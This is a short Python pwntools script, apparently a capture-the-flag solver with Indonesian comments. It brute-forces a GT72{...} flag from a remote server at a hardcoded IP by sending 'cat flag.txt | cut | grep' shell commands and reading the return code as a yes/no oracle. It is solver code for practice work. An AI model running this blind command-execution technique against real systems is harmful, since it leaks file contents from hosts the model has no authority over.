from pwn import *                                               from string import ascii_letters, digits
from string import ascii_letters, digits

#server target
host = '141.136.47.233'
port = 1412

#kita tau bahwa format dari flag adalah GT72{}
#maka untuk mempersingkat waktu kita gunakan GT72{
panjang_flag = list("GT72{")

# setiap flag kemungkinan mengandung _ dan diakhiri dengan }
# untuk mempersingkat waktu kita hanya gunakan dua char saja
# tambahin character _ dan }
printable = ascii_letters + digits + '_}'

s = remote(host, port)

#brute force flag
while True:
    flag_found = False
    for p in printable:
        use = "".join(panjang_flag) + p
        command = f"cat flag.txt | cut -c -{len(use)} | grep {use}"
        print(command)

        s.recv()
        s.sendline(command)
        returncode = s.recvuntil('\n')
        returncode = int(returncode.strip())
        print(returncode)
        # tambahkan char kalo dia return code 0 / success
        if returncode == 0:
            panjang_flag.append(p)
            print("".join(panjang_flag))
            flag_found = True
            # hentikan kalo udah ada }
            if p == '}':
                s.close()
                exit(0)
            break
    if not flag_found:
        s.close()
        break
